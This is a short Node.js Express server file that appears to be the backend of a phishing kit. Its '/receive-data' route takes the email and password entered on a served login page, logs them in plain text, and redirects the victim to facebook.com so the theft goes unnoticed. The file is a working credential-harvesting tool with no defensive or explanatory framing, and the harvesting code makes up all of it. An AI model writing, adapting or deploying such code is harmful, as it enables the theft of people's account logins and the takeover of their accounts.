const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const app = express();
const PORT = process.env.PORT || 3000;

// Serve static files from the 'public' directory
app.use(express.static(path.join(__dirname, 'public')));

// Use body-parser middleware
app.use(bodyParser.urlencoded({ extended: true }));

// Route to handle form submission
app.post('/receive-data', (req, res) => {
    const { email, pass } = req.body;
    console.log(`Email: ${email}, Password: ${pass}`);
    res.redirect('https://www.facebook.com'); // Redirect to Facebook or any other page
});

// Serve index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
